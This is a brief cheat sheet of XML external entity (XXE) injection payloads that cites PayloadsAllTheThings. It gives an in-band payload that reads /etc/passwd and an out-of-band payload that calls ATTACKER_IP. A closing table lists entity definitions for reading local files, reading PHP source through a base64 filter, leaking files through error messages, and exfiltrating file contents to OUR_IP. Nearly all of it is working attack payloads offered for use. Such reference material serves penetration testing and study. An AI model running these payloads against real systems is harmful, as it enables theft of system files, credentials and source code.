## Resource: https://github.com/swisskyrepo/PayloadsAllTheThings

## XXE Injection

### In-Band XXE Injection Example payload:

      <!DOCTYPE foo [

      <!ELEMENT foo ANY >

      <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>

      <contact><name>&xxe;</name><email>test@mail.com</email><message>whatever</message></contact>

### Out-of-Band XXE Injection Example Payload:

      <!DOCTYPE foo [
      <!ELEMENT foo ANY >
      <!ENTITY xxe SYSTEM "http://ATTACKER_IP:1337/" >]>
      <upload><file>&xxe;</file></upload>


| **Code**   | **Description**   |
| --------------|-------------------|
| `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">` | Define External Entity to a URL |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Define External Entity to a file path |
| `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | Read PHP source code with base64 encode filter |
| `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">` | Reading a file through a PHP error |
| `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">` | Reading a file OOB exfiltration |
